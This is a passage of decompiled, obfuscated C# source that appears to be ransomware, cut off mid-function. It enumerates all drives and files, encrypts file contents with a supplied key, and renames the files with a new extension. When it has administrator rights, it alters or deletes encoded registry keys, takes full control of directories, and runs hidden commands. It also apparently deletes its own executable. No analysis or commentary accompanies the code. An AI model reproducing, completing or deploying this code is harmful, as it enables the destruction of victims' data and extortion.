				if (!text.Contains(getString_0(107388262)) && !text.Contains(getString_0(107388237)) && !text.Contains(getString_0(107388204)) && !text.ToLower().Contains(getString_0(107388155)) && !text.ToLower().Contains(getString_0(107388174)) && !text.Contains(getString_0(107388117)) && !text.Contains(getString_0(107388096)) && !text.ToLower().Contains(getString_0(107388083)) && !text.ToLower().Contains(getString_0(107388102)) && !text.ToLower().Contains(getString_0(107388065)) && !text.ToLower().Contains(getString_0(107388024)) && !text.ToLower().Contains(getString_0(107388039)) && !text.ToLower().Contains(getString_0(107388506)) && !text.ToLower().Contains(getString_0(107388525)) && !text.ToLower().Contains(getString_0(107388472)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107388447)) && !fileInfo.FullName.Contains(getString_0(107388462)) && !fileInfo.FullName.Contains(getString_0(107388413)) && !fileInfo.FullName.Contains(getString_0(107388428)) && !fileInfo.FullName.Contains(getString_0(107388379)) && !fileInfo.FullName.Contains(getString_0(107388394)) && !fileInfo.FullName.Contains(getString_0(107388345)) && !fileInfo.FullName.Contains(getString_0(107388360)) && !fileInfo.FullName.Contains(getString_0(107388315)) && !fileInfo.FullName.Contains(getString_0(107388326)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388281)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388300)) && !fileInfo.FullName.ToLower().Contains(getString_0(107387739)) && !fileInfo.FullName.ToLower().Contains(getString_0(107387754)) && !fileInfo.FullName.Contains(PhXjLAIdTCy(getString_0(107387705))) && !fileInfo.FullName.Contains(getString_0(107387680)) && !fileInfo.FullName.Contains(getString_0(107397136)) && !fileInfo.FullName.Contains(getString_0(107387667)) && !fileInfo.FullName.EndsWith(getString_0(107395231)) && !fileInfo.FullName.EndsWith(getString_0(107387642)) && !fileInfo.FullName.EndsWith(getString_0(107387637)) && !fileInfo.FullName.EndsWith(getString_0(107387664)) && !fileInfo.FullName.EndsWith(getString_0(107387659)) && !fileInfo.FullName.Contains(getString_0(107387654)) && !fileInfo.FullName.Contains(LIbWxYpDOmPy) && !fileInfo.FullName.Contains(jnRLNtXuRRg) && !fileInfo.FullName.Contains(diaHTfOFnw))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(cJvZgRMCiiT) * 1024.0 * 1024.0 && kvJFoDYMuC == getString_0(107396836))
						{
							list.Add(fileInfo.FullName);
							DZJIALdkTcbougKnDn(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && kvJFoDYMuC == getString_0(107396996))
						{
							list.Add(fileInfo.FullName);
							DZJIALdkTcbougKnDn(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void uGjBrdWVRIU()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107387605));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!HoHveMjVjvX.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107387552), getString_0(107397109)).Replace(getString_0(107387547), getString_0(107387552))
					.Replace(getString_0(107387538), getString_0(107388555))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					HoHveMjVjvX.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107387552), getString_0(107397109)).Replace(getString_0(107387547), getString_0(107387552))
						.Replace(getString_0(107387538), getString_0(107388555))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107387565), getString_0(107388555)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string tLMiMedPBjRN(string ZrBWvWfWECKBgB = "", string aLHwmPfadgx = "")
	{
		string result = getString_0(107388555);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = ZrBWvWfWECKBgB,
				Arguments = aLHwmPfadgx,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void rAZRsijHJK(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107387556),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string XvbRsShmdArZzku(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string PhXjLAIdTCy(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	private static void uCRUdOISINB()
	{
		//IL_0257: Unknown result type (might be due to invalid IL or missing references)
		//IL_025e: Expected O, but got Unknown
		//IL_0280: Unknown result type (might be due to invalid IL or missing references)
		//IL_0287: Expected O, but got Unknown
		ZaouVntqiSww();
		List<eeZisWuvYA> list = eeZisWuvYA.WiAwJkpftxDvb();
		foreach (eeZisWuvYA item in list)
		{
			ttBolWBjlrOWveAHe.Add(item.IPAddress);
		}
		List<string> source = ttBolWBjlrOWveAHe;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate1e == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate1e = delegate(string string_0)
			{
				srrHuxcqQLoZC CS_0024_003C_003E8__locals0 = new srrHuxcqQLoZC();
				CS_0024_003C_003E8__locals0.PWgItyVYDrnlaJwQf = string_0;
				if ((!CS_0024_003C_003E8__locals0.PWgItyVYDrnlaJwQf.StartsWith(getString_0(107385162)) && !CS_0024_003C_003E8__locals0.PWgItyVYDrnlaJwQf.StartsWith(getString_0(107385157)) && !CS_0024_003C_003E8__locals0.PWgItyVYDrnlaJwQf.StartsWith(getString_0(107385116)) && !CS_0024_003C_003E8__locals0.PWgItyVYDrnlaJwQf.StartsWith(getString_0(107388555))) || !dBSQTvAQfYhhe.pqxLdPrWdAai(CS_0024_003C_003E8__locals0.PWgItyVYDrnlaJwQf))
				{
					return;
				}
				try
				{
					Thread.Sleep(rHOZvgFGaXKMdexR);
					HoHveMjVjvX.Add(getString_0(107387552) + CS_0024_003C_003E8__locals0.PWgItyVYDrnlaJwQf + getString_0(107385135));
					try
					{
						if (qoRjYABduZF)
						{
							Console.WriteLine(getString_0(107387552) + CS_0024_003C_003E8__locals0.PWgItyVYDrnlaJwQf + getString_0(107385135));
						}
					}
					catch
					{
					}
					Parallel.For(68, 91, delegate(int int_0)
					{
						Thread.Sleep(rHOZvgFGaXKMdexR);
						HoHveMjVjvX.Add(srrHuxcqQLoZC.getString_0(107387559) + CS_0024_003C_003E8__locals0.PWgItyVYDrnlaJwQf + srrHuxcqQLoZC.getString_0(107397116) + (char)int_0 + srrHuxcqQLoZC.getString_0(107402592));
						try
						{
							if (qoRjYABduZF)
							{
								Console.WriteLine(srrHuxcqQLoZC.getString_0(107387559) + CS_0024_003C_003E8__locals0.PWgItyVYDrnlaJwQf + srrHuxcqQLoZC.getString_0(107397116) + (char)int_0 + srrHuxcqQLoZC.getString_0(107402592));
							}
						}
						catch
						{
						}
					});
				}
				catch
				{
				}
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate1e);
		try
		{
			dBSQTvAQfYhhe.serMlcSCVBPW serMlcSCVBPW = new dBSQTvAQfYhhe.serMlcSCVBPW(dBSQTvAQfYhhe.SoFzEeBJewRLP.ORBEXTVdDjgHDCh, dBSQTvAQfYhhe.vdXmePlCiXkA.YxLzAwRoJgos, dBSQTvAQfYhhe.oDpfUBNiXbjBgDO.NbTduHqHDqRAdp, dBSQTvAQfYhhe.djTfoTtYmXACm.YOBBxCHbaaOU);
			foreach (string item2 in serMlcSCVBPW)
			{
				MatchCollection matchCollection = Regex.Matches(item2, getString_0(107387507));
				foreach (Match item3 in matchCollection)
				{
					try
					{
						if (!HoHveMjVjvX.Contains(item3.ToString()))
						{
							HoHveMjVjvX.Add(item3.ToString());
						}
					}
					catch
					{
					}
					try
					{
						if (qoRjYABduZF)
						{
							Console.WriteLine(item3.ToString());
						}
					}
					catch
					{
					}
				}
			}
		}
		catch (Exception)
		{
		}
		XPNBcIVPaeWD.UUAImYiDYfe();
		try
		{
			if (qoRjYABduZF)
			{
				Console.WriteLine(getString_0(107387970));
			}
		}
		catch
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string string_ = XvbRsShmdArZzku(getString_0(107387897));
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(PhXjLAIdTCy(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(PhXjLAIdTCy(getString_0(107387824)), 1, RegistryValueKind.DWord);
					registryKey.SetValue(PhXjLAIdTCy(getString_0(107387223)), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (NRDQBoJkcw == getString_0(107396836))
		{
			YwweHUBoXKc.UaIpTTmaRi();
		}
		try
		{
			if (qoRjYABduZF)
			{
				Console.WriteLine(getString_0(107387210));
			}
		}
		catch
		{
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107387605));
		ManagementObjectEnumerator enumerator4 = val.Get().GetEnumerator();
		try
		{
			while (enumerator4.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator4.get_Current();
				if (HoHveMjVjvX.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107387552), getString_0(107397109)).Replace(getString_0(107387547), getString_0(107387552))
					.Replace(getString_0(107387538), getString_0(107388555))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					continue;
				}
				try
				{
					if (qoRjYABduZF)
					{
						Console.WriteLine(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107387552), getString_0(107397109)).Replace(getString_0(107387547), getString_0(107387552))
							.Replace(getString_0(107387538), getString_0(107388555))
							.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107387565), getString_0(107388555)));
					}
				}
				catch
				{
				}
				HoHveMjVjvX.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107387552), getString_0(107397109)).Replace(getString_0(107387547), getString_0(107387552))
					.Replace(getString_0(107387538), getString_0(107388555))
					.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107387565), getString_0(107388555)));
			}
		}
		finally
		{
			((IDisposable)enumerator4)?.Dispose();
		}
		try
		{
			if (qoRjYABduZF)
			{
				Console.WriteLine(getString_0(107387121));
			}
		}
		catch
		{
		}
	}

	public static void WbYRPqkvADfNl(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = PhXjLAIdTCy(getString_0(107387084));
		processStartInfo.Arguments = getString_0(107387055) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool WZXZsPCXUvqpx(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string iOetfsQkxCeX(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void KGVTKVBgGWup()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = XvbRsShmdArZzku(getString_0(107387050));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(PhXjLAIdTCy(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(PhXjLAIdTCy(getString_0(107387392)));
					registryKey.DeleteSubKey(PhXjLAIdTCy(getString_0(107387399)));
					registryKey.DeleteSubKey(PhXjLAIdTCy(getString_0(107387350)));
					registryKey.DeleteSubKey(PhXjLAIdTCy(getString_0(107387325)));
					registryKey.DeleteSubKey(PhXjLAIdTCy(getString_0(107387084)));
					registryKey.DeleteSubKey(PhXjLAIdTCy(getString_0(107387332)));
					registryKey.DeleteSubKey(PhXjLAIdTCy(getString_0(107387303)));
					registryKey.Close();
				}
				string_ = XvbRsShmdArZzku(getString_0(107387254));
				registryKey = Registry.LocalMachine.OpenSubKey(PhXjLAIdTCy(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(PhXjLAIdTCy(getString_0(107386645)));
					registryKey.Close();
				}
				string_ = XvbRsShmdArZzku(getString_0(107386660));
				registryKey = Registry.LocalMachine.OpenSubKey(PhXjLAIdTCy(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(PhXjLAIdTCy(getString_0(107386645)));
					registryKey.Close();
				}
				string_ = XvbRsShmdArZzku(getString_0(107386660));
				registryKey = Registry.CurrentUser.OpenSubKey(PhXjLAIdTCy(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(PhXjLAIdTCy(getString_0(107386645)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			tLMiMedPBjRN(PhXjLAIdTCy(getString_0(107386611)), PhXjLAIdTCy(getString_0(107386626)));
			tLMiMedPBjRN(PhXjLAIdTCy(getString_0(107386545)), PhXjLAIdTCy(getString_0(107386568)));
			tLMiMedPBjRN(PhXjLAIdTCy(getString_0(107386545)), PhXjLAIdTCy(getString_0(107386902)));
			tLMiMedPBjRN(PhXjLAIdTCy(getString_0(107386841)), PhXjLAIdTCy(getString_0(107386856)));
		}
		catch
		{
		}
	}

	public static void ixTFoaDRJMY(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(PhXjLAIdTCy(getString_0(107386751)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void qbLGPZIjVGHs()
	{
		string string_ = XvbRsShmdArZzku(getString_0(107386758));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(PhXjLAIdTCy(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(PhXjLAIdTCy(getString_0(107386133)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void ZaouVntqiSww()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			tLMiMedPBjRN(PhXjLAIdTCy(getString_0(107386100)), PhXjLAIdTCy(getString_0(107386119)));
			tLMiMedPBjRN(PhXjLAIdTCy(getString_0(107386100)), PhXjLAIdTCy(getString_0(107385989)));
		}
	}

	public static void uheBeCJUIksTneW()
	{
		tLMiMedPBjRN(getString_0(107396402), PhXjLAIdTCy(getString_0(107386323)));
		string text = PhXjLAIdTCy(getString_0(107385617));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107387538) + text + getString_0(107387538) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396402);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void opWbnDRtWCXNbKkM(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (joesCNAxeHUI)
			{
				try
				{
					File.AppendAllText(jnRLNtXuRRg, getString_0(107385584) + string_0 + getString_0(107385575) + ex.Message + getString_0(107396237));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string ProlBhJTlUdn()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107388555);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107385486);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107385509))) ? getString_0(107385459) : getString_0(107385468));
				break;
			case 0:
				text = getString_0(107385514);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107385481);
				break;
			case 4:
				text = getString_0(107385948);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107385962) : getString_0(107385939));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107385906) : getString_0(107385911)) : getString_0(107385916)) : getString_0(107385957));
				break;
			case 10:
				text = getString_0(107385933);
				break;
			}
		}
		if (text != getString_0(107388555))
		{
			text = getString_0(107385928) + text;
			if (oSVersion.ServicePack != getString_0(107388555))
			{
				text = text + getString_0(107385883) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string cSgNnpdmLA(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395193);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(PhXjLAIdTCy(getString_0(107395672)));
				streamWriter.WriteLine(getString_0(107396237));
				streamWriter.WriteLine(PhXjLAIdTCy(getString_0(107392702)));
				streamWriter.WriteLine(string_0);
				if (MiZHZrKmtKkaPXn)
				{
					streamWriter.WriteLine(getString_0(107396237));
					streamWriter.WriteLine(PhXjLAIdTCy(getString_0(107393136)));
					streamWriter.WriteLine(LRKYNOUdGHN.mJPfHItsLp());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !IooTTsvIiwCN)
				{
					File.AppendAllText(text, getString_0(107393103) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (joesCNAxeHUI)
			{
				try
				{
					File.AppendAllText(jnRLNtXuRRg, getString_0(107385878) + ex.Message + getString_0(107396237));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void ymlQPyHRYAlbpQK(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		hVxHXOomQHkJx.LhmuMiwbEJnjfZN CS_0024_003C_003E8__locals0 = new hVxHXOomQHkJx();
		CS_0024_003C_003E8__locals0.gEhXXIzChk = string_1;
		CS_0024_003C_003E8__locals0.WLgJdVMBruB = string_2;
		CS_0024_003C_003E8__locals0.wxfrhJHvjWjHlu = string_3;
		CS_0024_003C_003E8__locals0.sZqoWBfJdvFIl = string_4;
		lrVhqMPbYlaOK = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.wxfrhJHvjWjHlu);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107385821))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !HoHveMjVjvX.Contains(array[i].Name))
					{
						HoHveMjVjvX.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!HoHveMjVjvX.Contains(string_0[j]))
				{
					HoHveMjVjvX.Add(string_0[j]);
				}
			}
		}
		if (HoHveMjVjvX.Contains(PhXjLAIdTCy(getString_0(107385812))) && rHeEvpAbjCjyvEaC == getString_0(107396836))
		{
			HoHveMjVjvX.Remove(PhXjLAIdTCy(getString_0(107385812)));
		}
		Parallel.ForEach(HoHveMjVjvX, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new hVxHXOomQHkJx.LhmuMiwbEJnjfZN();
			CS_0024_003C_003E8__locals0.oawEYUfXgfBQ = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.NyPtOimZdkEdllM = string_0;
			if (upflSQRmeWP && !ProlBhJTlUdn().Contains(hVxHXOomQHkJx.getString_0(107385974)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						WZXZsPCXUvqpx(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.NyPtOimZdkEdllM);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (iEHeKlEPYHGI == hVxHXOomQHkJx.getString_0(107396848))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					cldnMztlbqne(CS_0024_003C_003E8__locals0.NyPtOimZdkEdllM, CS_0024_003C_003E8__locals0.oawEYUfXgfBQ.gEhXXIzChk, CS_0024_003C_003E8__locals0.oawEYUfXgfBQ.sZqoWBfJdvFIl, CS_0024_003C_003E8__locals0.oawEYUfXgfBQ.WLgJdVMBruB, CS_0024_003C_003E8__locals0.oawEYUfXgfBQ.wxfrhJHvjWjHlu);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				cldnMztlbqne(CS_0024_003C_003E8__locals0.NyPtOimZdkEdllM, CS_0024_003C_003E8__locals0.gEhXXIzChk, CS_0024_003C_003E8__locals0.sZqoWBfJdvFIl, CS_0024_003C_003E8__locals0.WLgJdVMBruB, CS_0024_003C_003E8__locals0.wxfrhJHvjWjHlu);
			}
		});
	}

	public static void cldnMztlbqne(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107388555));
		List<string> list3 = list2;
		if (VsxmPTvejQSFs == getString_0(107396996))
		{
			list = rLMXbmGnoPrqAy(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = RAjgPCVHZF.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_03a0;
					}
				}
				if ((ltuxRtIPjttT == getString_0(107396996) && !item.EndsWith(text)) || yGkMwQPqUdXIj.Contains(item))
				{
					continue;
				}
				if (cySCSfjuDKIn == getString_0(107396836))
				{
					try
					{
						if (femjyBXnUNA.ngUKfMrzBNU(item))
						{
							femjyBXnUNA.rVIDVvPdlEIDhn(item);
						}
					}
					catch
					{
					}
				}
				yGkMwQPqUdXIj.Add(item);
				if (!SlSeSNfJnzNh.Contains(Path.GetDirectoryName(item)))
				{
					SlSeSNfJnzNh.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (CdQMIPJOkrOUDSy == getString_0(107396836) && fileStream.Length > Convert.ToInt32(xYkYbBCyjIxz) * 1024 * 1024 && !list3.Contains(text))
					{
						if (bxhZXFvKXZl == getString_0(107396836))
						{
							foreach (string item2 in EKjYgfCTgvyfhvOPx)
							{
								if (item.ToLower().EndsWith(item2) && vEWBFQaTPDgk == getString_0(107396836))
								{
									if (Convert.ToInt32(PyFcFDpqJkSW) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											LRKYNOUdGHN.qatkvmOGuIr(getString_0(107388604), getString_0(107388599), getString_0(107388618), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && vEWBFQaTPDgk == getString_0(107396996))
								{
									try
									{
										LRKYNOUdGHN.qatkvmOGuIr(getString_0(107388604), getString_0(107388599), getString_0(107388618), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = RgELsEgHUCW.yawJYYjGarh(item, Convert.ToInt32(xYkYbBCyjIxz) * 1024 * 1024);
						byte[] kSmujIomiIqp = RgELsEgHUCW.eUGEbOMOKENsBL(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						RgELsEgHUCW.UWMgjLGhgbOURXn(item, kSmujIomiIqp);
						if (string_2 != getString_0(107385835))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107385835))
					{
						ooVjxwIPpbkKr(item, item + string_2, lrVhqMPbYlaOK);
					}
					else
					{
						ooVjxwIPpbkKr(item, item + getString_0(107385830), lrVhqMPbYlaOK);
					}
				}
				catch (Exception)
				{
				}
				IL_03a0:;
			}
		}
	}

	public static void DZJIALdkTcbougKnDn(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		YUIjdATTEVIX.dAvOkiJbjzoXh CS_0024_003C_003E8__locals0 = new YUIjdATTEVIX();
		CS_0024_003C_003E8__locals0.WNvdcTPDgW = list_0;
		CS_0024_003C_003E8__locals0.ZDxRrpKTbd = string_1;
		CS_0024_003C_003E8__locals0.dXgeOiXUaNyFEW = string_2;
		CS_0024_003C_003E8__locals0.nyAmnOdcSzzfJ = string_3;
		CS_0024_003C_003E8__locals0.ZfHQdOmNHVP = new List<string> { getString_0(107388555) };
		if (ltuxRtIPjttT == getString_0(107396996))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.WNvdcTPDgW)
				{
					if (CS_0024_003C_003E8__locals0.dXgeOiXUaNyFEW.Length != 0)
					{
						string[] dXgeOiXUaNyFEW2 = CS_0024_003C_003E8__locals0.dXgeOiXUaNyFEW;
						int num2 = 0;
						while (num2 < dXgeOiXUaNyFEW2.Length)
						{
							string value2 = dXgeOiXUaNyFEW2[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_09e1;
						}
					}
					try
					{
						if (item.EndsWith(CS_0024_003C_003E8__locals0.ZDxRrpKTbd))
						{
							goto IL_09e1;
						}
					}
					catch (Exception)
					{
						goto IL_09e1;
					}
					if (item.EndsWith(string_0) && !yGkMwQPqUdXIj.Contains(item))
					{
						if (cySCSfjuDKIn == YUIjdATTEVIX.getString_0(107396856))
						{
							try
							{
								if (femjyBXnUNA.ngUKfMrzBNU(item))
								{
									femjyBXnUNA.rVIDVvPdlEIDhn(item);
								}
							}
							catch
							{
							}
						}
						yGkMwQPqUdXIj.Add(item);
						if (!SlSeSNfJnzNh.Contains(Path.GetDirectoryName(item)))
						{
							SlSeSNfJnzNh.Add(Path.GetDirectoryName(item));
						}
						opWbnDRtWCXNbKkM(item);
						try
						{
							new CQyeXvaAck().qKRkxhexZuqHsOh(item);
						}
						catch
						{
						}
						try
						{
							using FileStream fileStream2 = new FileStream(item, FileMode.Open, FileAccess.Write);
							if (!fileStream2.CanWrite)
							{
								try
								{
									if (qoRjYABduZF)
									{
										Console.WriteLine(YUIjdATTEVIX.getString_0(107402600) + item + YUIjdATTEVIX.getString_0(107402587) + new FileInfo(item).Length + YUIjdATTEVIX.getString_0(107402534));
										Console.WriteLine(YUIjdATTEVIX.getString_0(107402557));
									}
								}
								catch
								{
								}
								tLMiMedPBjRN(PhXjLAIdTCy(YUIjdATTEVIX.getString_0(107402420)), YUIjdATTEVIX.getString_0(107387558) + item + YUIjdATTEVIX.getString_0(107387558) + PhXjLAIdTCy(YUIjdATTEVIX.getString_0(107402427)) + YUIjdATTEVIX.getString_0(107387558) + Environment.UserName + YUIjdATTEVIX.getString_0(107387558) + PhXjLAIdTCy(YUIjdATTEVIX.getString_0(107402378)));
							}
						}
						catch (Exception ex18)
						{
							if (joesCNAxeHUI)
							{
								try
								{
